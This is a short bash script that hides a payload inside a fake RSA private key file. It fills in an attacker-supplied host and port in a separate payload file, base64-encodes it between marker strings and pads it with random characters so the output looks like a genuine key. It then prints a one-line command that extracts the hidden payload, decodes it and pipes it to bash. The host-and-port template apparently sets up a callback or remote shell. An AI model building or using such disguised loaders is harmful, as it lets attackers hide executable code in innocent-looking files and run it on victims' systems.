#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo -e "ERROR\nUsage: $0 hostname port\nExample: $0 horadoshow.com.br 8090"
    exit 1
fi

host="$1"
port="$2"

function generatepadding(){
  cat /dev/urandom | tr -dc 'a-z-A-Z-0-9' | head -c 800 
}

fdlm="SPaY"
edlm="EpAy"
payload="$fdlm$(cat payload | sed "s/HOST/$host/g" | sed "s/PORT/$port/g" | base64)$edlm"
certificate="-----BEGIN RSA PRIVATE KEY-----\n$(generatepadding)$payload$(generatepadding)\n-----END RSA PRIVATE KEY-----" 

echo -e $certificate | sed -e "s/.\{65\}/&\n/g" > "`pwd`/cert.key"
echo -e "----Fake certificate----\n`pwd`/cert.key\n"
echo "----Payload Eval command----"
echo "cat `pwd`/cert.key | tr -d '\n' |  sed -n 's/.*SPaY\(.*\)EpAy.*/\1/p' | base64 -d | bash"
